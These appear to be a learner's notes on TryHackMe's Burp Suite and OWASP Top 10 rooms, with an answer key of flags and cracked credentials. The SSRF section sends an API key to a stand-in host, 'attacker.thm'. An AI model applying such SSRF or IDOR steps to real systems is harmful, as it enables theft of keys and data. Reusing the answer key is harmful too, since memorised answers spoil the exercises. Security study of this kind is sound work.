    - **Search:** Find settings using keywords.
    - **Type Filter:**
        - _User settings_ – global options.
        - _Project settings_ – session-specific options.
    - **Categories:** Browse settings by category.
### 4. Shortcut Access

- Many tools include **direct buttons** to their specific settings.
    
    - Example: The **Proxy module** has a **Proxy Settings** button that jumps straight to proxy configurations.

Q: In which category can you find a reference to a "cookie jar" ? 
A: Sessions 

Q: In which base category can you find the "Updates" sub-category, which controls the Burp Suite update behaviour ? 
A: Suite 

Q: What is the name of the sub-category which allows you to change key bindings for shortcuts in Burp Suite ? 
A: Hot keys 

Q: If we have uploaded Client-Side TLS certificates, can we override these on a per-project basis (yea/nay) ?
A: yea 

## Burp Proxy 

### Key behaviours

- **Intercept requests** — holds requests before they reach the server so you can edit, forward, drop, or route them to other Burp tools.
- **Intercept toggle** — click **Intercept is on/off** to enable or disable active interception (requests still get logged when interception is off).
- **Capture & logging** — all proxied requests (and WebSockets) are recorded in **HTTP history** / **WebSockets history** for later analysis.
- **Send to other tools** — intercepted or logged items can be forwarded to Repeater, Intruder, Scanner (Pro), Decoder, etc.

### Useful Proxy features & settings

- **Proxy settings** — opens comprehensive options to configure proxy behaviour (access via the Proxy module shortcut).
- **Response interception rules** — by default responses aren’t intercepted; enable **Intercept responses based on the following rules** to intercept server replies selectively.
- **Match and Replace** — apply regex-based automatic modifications to incoming/outgoing traffic (e.g., change User-Agent, modify cookies, rewrite headers/body).
- **Per-request controls** — choose to intercept responses or apply other per-request actions when needed.

## Site Map and Issue Definitions 

### Site map

- Automatically records pages/endpoints visited while the proxy is active.
- Displays the target as a tree (URLs → paths → resources).
- Useful for manual enumeration and mapping APIs (captures API endpoints).
- **Pro:** automated crawling to discover links; **Community:** manual browsing builds the map.

### Issue definitions

- A catalog of vulnerabilities the Burp scanner checks for (descriptions + references).
- Handy reference for writing reports or explaining issues found during manual testing.
- Available even if automated scanning isn’t available in Community edition.
### Scope settings

- Define what’s **in-scope** or **out-of-scope** (domains, IPs).
- Helps focus testing and avoid capturing irrelevant traffic.
- Use scope to restrict logging, scanning, and automated actions to intended targets.

Q: What is the flag you receive after visiting the unusual endpoint ? 
A: THM{NmNlZTliNGE1MWU1ZTQzMzgzNmFiNWVk}

## Scoping and Targeting 

Scoping limits what Burp captures, logs, and (optionally) intercepts so you can focus only on intended targets and avoid noisy, irrelevant traffic.

### Why scope?

- Capturing _everything_ becomes overwhelming and slows analysis.
- Scoping keeps traffic, logs, and actions confined to the web app(s) you’re testing.
### Quick steps to set scope

1. Open **Target → Site map**.
2. **Right-click** the target (domain/path) in the site map → **Add to scope**.
3. When prompted, choose **Yes** to stop logging out-of-scope traffic (recommended).
4. Verify or edit entries in **Target → Scope settings** (include / exclude domains or IPs).
### Prevent proxy from intercepting out-of-scope requests

- Go to **Proxy → Options → Intercept Client Requests** (or Proxy settings).
- Enable the rule **"And URL is in target scope"** so the proxy **ignores** traffic not in scope.
- Result: cleaner proxy view + no accidental interception of irrelevant traffic.


## Proxying HTTPS 

Fix HTTPS/TLS certificate errors caused by Burp’s interception of encrypted traffic.

- **Download the CA Certificate**
    
    - Ensure Burp Proxy is running.
    - Visit `http://burp/cert` → downloads `cacert.der`.
    - Save it locally.
        
- **Open Firefox Certificate Settings**
    
    - In Firefox, go to the URL bar → type `about:preferences`.
    - Search for “**certificates**” → click **View Certificates**.
        
- **Import the CA Certificate**
    
    - In the Certificate Manager → click **Import**.
    - Select the downloaded `cacert.der` file.
        
- **Set Trust Permissions**
    
    - Check **“Trust this CA to identify websites”**.
    - Click **OK** to confirm.


# OWASP Top 10 - 2021

![[mapping.png]]

## 1. Broken Access Control 

Broken Access Control occurs when a website fails to properly restrict access to certain pages or functionalities, allowing unauthorized users to view or perform actions meant only for specific roles (e.g., admin).
### Consequences

- Unauthorized users can:
    
    - View **sensitive information** belonging to others.
    - **Access restricted functionalities** (like user management or admin panels).
### Impact

- Attackers can **bypass authorization** mechanisms.
- Leads to **data exposure** or **privilege escalation**.

### Real-World Example (2019)

- A vulnerability in **YouTube** allowed attackers to retrieve individual frames from **private videos**.
- By requesting multiple frames, the attacker could partially **reconstruct** the private video.
- This violated the user’s expectation of privacy → **Broken Access Control vulnerability**.

## IDOR Challenge 

- IDOR (Insecure Direct Object Reference) is an **access control vulnerability** where attackers can access unauthorized resources by **manipulating direct object references** (like IDs or file names).
### Cause

- Occurs when an application exposes internal object identifiers (e.g., `id`, `file`, `user`) **without verifying ownership or permissions**.
### Example

- URL: `https://bank.thm/account?id=111111` → shows user’s account.
- Attacker changes it to `id=222222` → accesses another user’s data if no validation is enforced.
### Key Point

- The issue isn’t the direct reference itself, but **the lack of authorization checks** to confirm that the logged-in user owns or has rights to the referenced object.
### Impact

- Unauthorized data exposure (e.g., user info, financial records).
- Possible account takeover or data modification.

Q: Look at other user's notes. What is the flag ? 
A: flag{fivefourthree}

## 2.  Cryptographic Failures 

Cryptographic failures occur when cryptography is misused, poorly implemented, or omitted—leading to exposure of sensitive data.

### Why it matters

- Protects **data in transit** (e.g., HTTPS/TLS) and **data at rest** (e.g., encrypted DB fields/files).
- Failures enable eavesdropping, data theft, replay/MITM attacks, or direct leakage from servers.
### Common scenarios

- **Missing or weak TLS** → attackers can read or tamper network traffic.
- **Sensitive data stored unencrypted or with weak algorithms** → attacker who obtains backups or DB files can read data.
- **Improper key management** or hardcoded keys/tokens in code.
- **Using reversible or fast hashes for passwords** (no salted slow hashing) — easy to crack.
### Flat-file DBs (SQLite) — risk context

- Small apps may use **flat-file DBs** (e.g., SQLite) stored as files.
- If database files are placed under the web root or otherwise accessible, an attacker can download them and extract all contained data.
    
### Quick SQLite investigative steps (command line)

1. Check file type: `file example.db`    
2. Open DB: `sqlite3 example.db`
3. List tables: `.tables`
4. Show table schema: `PRAGMA table_info(table_name);`
5. Dump rows: `SELECT * FROM table_name;`

Q: What is the name of the mentioned directory ? 
A: /assets

Q: Navigate to the directory you found in question one. what file stands out as being likely to contain sensitive data ? 
A: webapp.db

Q: Use the supporting material to access the sensitive data. What is the password hash of the admin user ? 
A: 6eea9b7ef19179a06954edd0f6c05ceb

Q: Crack the hash. What is the admin's plaintext password ? 
A: qwertyuiop

Q: Log in as the admin. What is the flag ? 
A: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## 3. Injection 

- Injection flaws occur when an application treats **user input as code/commands**, allowing attackers to change the intended behaviour (e.g., SQL injection, command injection).

- **Common types:**
    
    - **SQL Injection:** user input injected into database queries.
    - **Command Injection:** user input passed to OS/shell commands.
        
- **Root cause:**  
    Unsanitised user-controlled input concatenated into commands/queries (the app trusts client data and does not enforce authorization or safe handling).
    
- **Illustrative (high-level) example:**  
    A web app that builds a shell call using two user parameters and executes it on the server is dangerous — if an attacker can inject shell syntax, they can make the server execute arbitrary commands.
    
- **Why it’s bad:**  
    Attackers can read/modify/delete data, execute arbitrary OS commands, escalate access, or pivot inside the network.
    
- **Exploitation vector (conceptual):**  
    Shell features that evaluate expressions or nested commands can be abused to run attacker-supplied commands when input is embedded directly into a shell call.
    
- **Mitigations / best practices:**
    
    - **Never pass raw user input into shell or query strings.**
    - Use **allow-lists** (valid input sets) rather than blacklists.
    - Use **parameterized queries** for databases (prepared statements).
    - Use safe APIs that accept argument arrays (avoid shell evaluation).
    - **Escape or validate** inputs strictly when external commands are unavoidable.
    - **Disable or avoid** dangerous functions (system/passthru/etc.) where possible.
    - Apply **least privilege** to application processes and isolate execution.
    - Implement **logging, monitoring, and input size limits** to detect abuse.

Q: What strange text file is in the website's root directory ? 
A: drepper.txt 

Q: How many non-root/non-service/non-daemon users are there ? 
A: 0 

Q: What user is this app running as ? 
A: apache 

Q: What is the user's shell set as ? 
A: /sbin/nologin 

Q: What version of Alpine Linux is running ? 
A: 3.16.0


## 4. Insecure Design 

- Insecure design refers to **security flaws in the architecture or logic** of an application — vulnerabilities that arise from poor planning or missing security considerations during the **design phase**, not from faulty implementation.
    
- **Root cause:**
    
    - **Lack of proper threat modelling** during system design.
    - **Assumptions** about user behaviour or attacker capability.
    - Developers introducing **shortcuts** (e.g., disabling security checks for testing) and forgetting to restore them.
        
- **Example – Instagram Password Reset Flaw:**
    
    - Instagram used a **6-digit SMS code** for password reset.
    - Implemented **rate limiting** (250 attempts per IP).
    - **Design flaw:** Rate limiting was based only on IP address.
    - Attackers could use **multiple IPs (via cloud servers)** to bypass rate limiting and brute-force the code.
    - Vulnerability existed in **system logic**, not implementation — the assumption that users wouldn’t control many IPs was wrong.
        
- **Impact:**
    
    - Can lead to large-scale exploitation even when code seems correct.
    - Typically **requires redesigning the system or feature** to fix (e.g., centralizing rate limits, introducing account-based limits).
        
- **Mitigation / Best Practices:**
    
    - **Perform Threat Modelling** early in development (identify possible abuse cases).
    - Apply **Secure Software Development Lifecycle (SSDLC)** principles.
    - Avoid hard-coded assumptions about attacker capabilities.
    - Use **centralized security controls** for critical functions (auth, rate limiting).
    - Enforce **defense-in-depth** (multiple security layers).
    - Regularly review **security design** before release and after major updates.

Q: What is the value of the flag in joseph's account ? 
A: THM{Not_3ven_c4tz_c0uld_sav3_U!}

## 5. Security Misconfiguration 

- Security misconfigurations happen when security settings are incorrectly set or left at insecure defaults.
- Even updated software can be vulnerable if poorly configured.

**Examples:**

- Misconfigured cloud permissions (e.g., public S3 buckets).
- Unnecessary services, pages, or accounts enabled.
- Default accounts with unchanged passwords.
- Detailed error messages revealing system info.
- Missing HTTP security headers.

**Impact:**

- Can lead to further vulnerabilities like default credential access, XXE, or command injection.

**Debugging Interfaces:**

- Debugging features left enabled in production can be exploited.
- Frameworks often include debug consoles for development.
- If exposed, attackers can execute arbitrary code on the server.

**Example:**

- Patreon (2015) hack due to exposed Werkzeug debug console, allowing remote code execution.
    

**Prevention:**

- Disable debugging in production.
- Apply proper permissions and secure configurations.
- Limit features, services, and privileges to only what’s necessary.
- Use security headers and hide detailed error information.

Q: What is the database file name (the one with the .db extension) in the current directory ? 
A: todo.db

Q: Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code ? 
A: THM{Just_a_tiny_misconfiguration}

## 6. Vulnerable and Outdated Components 

- Occurs when organizations use outdated software with known vulnerabilities.
- **Example**: Using an old version of WordPress (e.g., 4.6) that has a known unauthenticated remote code execution (RCE) vulnerability.
- Attackers can easily exploit such vulnerabilities using publicly available tools or exploits (e.g., found on Exploit-DB).
- These vulnerabilities are dangerous because:
    
    - They are **well-documented** and **easy to exploit**.
    - Attackers can compromise systems with minimal effort.
        
- Even missing a **single software update** can expose systems to multiple attacks.

Q: What is the content of the /opt/flag.txt file ? 
A: THM{But_1ts_n0t_my_f4ult!}

## 7. Identification and Authentication Failures 

- Authentication verifies user identity; session management maintains state using cookies since HTTP(S) is stateless.
- **Risk:** Flaws in authentication allow attackers to gain unauthorized access to user accounts and sensitive data.

### Common Issues:

- **Brute Force Attacks:** Attackers try multiple username-password combinations.
- **Weak Credentials:** Allowing simple or common passwords (e.g., "password1").
- **Weak Session Cookies:** Predictable or easily guessable session values let attackers hijack sessions.

### Mitigations:

- Enforce **strong password policies**.
- Implement **account lockout** after several failed login attempts.
- Use **Multi-Factor Authentication (MFA)** for additional security layers.

Q: What is the flag you found in darren's account ? 
A: fe86079416a21a3c99937fea8874b667

Q: What is the flag that you found in arthur's account ? 
A: d9ac0f7db4fda460ac3edeb75d75e16e

## 8. Software and Data Integrity Failures 

Integrity = confidence that data or software hasn't been changed (maliciously or accidentally).

**Quick checklist to protect & verify integrity**

- **Files/downloads:** Always verify a published hash (prefer SHA-256 or stronger).  
    Example commands:  
    `sha256sum file.bin` → compare to the vendor’s published SHA-256.

- **Third-party resources (JS/CSS):** Use **Subresource Integrity (SRI)** + HTTPS + `crossorigin`.  
    Example:  
    `<script src="https://example.com/lib.js" integrity="sha256-<BASE64_HASH>" crossorigin="anonymous"></script>`
    
- **Session data / client-stored values:** **Never trust client data.** Keep authoritative state server-side or use **signed** tokens.
    
- **JWTs:** Sign tokens with a secure algorithm and secret/key (HMAC or, preferably, asymmetric signing). **Reject tokens with `alg: none`** and always verify the signature and `exp`/`iat` claims.
![[11c86acaea05f98045cec5634e03e997.png]]

    
- **Supply-chain:** Pin versions, verify checksums for packages, and prefer package registries that support signing (or use provenance tooling).
    
- **Defenses in depth:** key rotation, monitoring for unexpected changes, and keep libraries up to date.

Q: What's is the SHA-256 of https://code.jquery.com/jquery-1.12.4.min.js ? 
A: sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=

Q: Try logging into the application as guest. What is quest's account password ? 
A: guest 

Q: What is the name of the website's cookie containing a JWT token  ?
A: jwt-session 

Q: What is the flag presented to the admin user ? 
A: THM{Dont_take_cookies_from_strangers}

## 9. Security Logging and Monitoring Failures 

Logging tracks every user and system action to **detect, analyze, and respond** to security incidents. Without it, attacks can go unnoticed and untraceable.

### Why Logging Matters

- **Incident response:** Traces attacker actions after a breach.
- **Regulatory compliance:** Prevents fines by proving what happened.
- **Threat detection:** Helps spot unusual or malicious behavior early.
    
###  What to Log

Include key data in every log entry:

- **Timestamps** (accurate & synchronized)
- **Usernames / session IDs**
- **IP addresses & geolocation**
- **HTTP status codes**
- **Visited pages / API endpoints**

 **Protect logs:**

- Store securely (encrypt + access control).
- Keep **redundant backups** in separate locations.

### Monitoring Suspicious Activity

Common red flags:

- Repeated **failed logins** or access to restricted areas.
- **Anomalous IPs or geolocations** (possible account takeover).
- Signs of **automation** (rapid or tool-based requests).
- **Known payloads** (SQLi, XSS patterns, etc.).

### Response & Alerting

- Assign **impact levels** (low, medium, high).
- **Automate alerts** for high-impact or repeated suspicious activity.
- Use **SIEM tools** (e.g., Splunk, ELK, Graylog) to collect and analyze logs.
- Review logs **regularly** — prevention is better than post-incident analysis.

Q: What IP is the attacker using ? 
A: 49.99.33.16 

Q: What kind of attack is being carried out ?
A: Brute Force 

## 10. Server Side Request Forgery 

- **Definition:** SSRF — attacker forces a web application to send requests on the attacker’s behalf to arbitrary destinations, controlling the request contents.
    
- **Typical origin:** occurs when an application makes outbound requests to third-party services using user-controllable parameters.
    
- **Vulnerable pattern (from text):** app exposes a `server` parameter used to build outbound request to an external API (e.g., SMS provider).
    
- **Attack flow (example):**
    
    - Legitimate: app calls SMS provider `https://sms-provider/api/send?msg=...&key=<API_KEY>`.
        
    - Attacker requests: `https://www.mysite.com/sms?server=attacker.thm&msg=ABC`.
        
    - App then requests: `https://attacker.thm/api/send?msg=ABC` — attacker receives API key and message.
        
- **Proof-of-concept capture (example):** attacker listens with netcat and observes the forwarded GET request from the server.
    
- **Consequences listed:**
    
    - Enumerate internal networks (IPs, ports).
    - Abuse trust relationships to access restricted services.
    - Interact with non-HTTP services potentially leading to RCE.

Q: Explore the website. What is the only host allowed to access the admin area ?
A: localhost 

Q: Check the Download Resume button. Where does the server parameter point to ? 
A: secure-file-storage.com 

Q: Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request ? 
A: THM{Hello_Im_just_an_API_key}



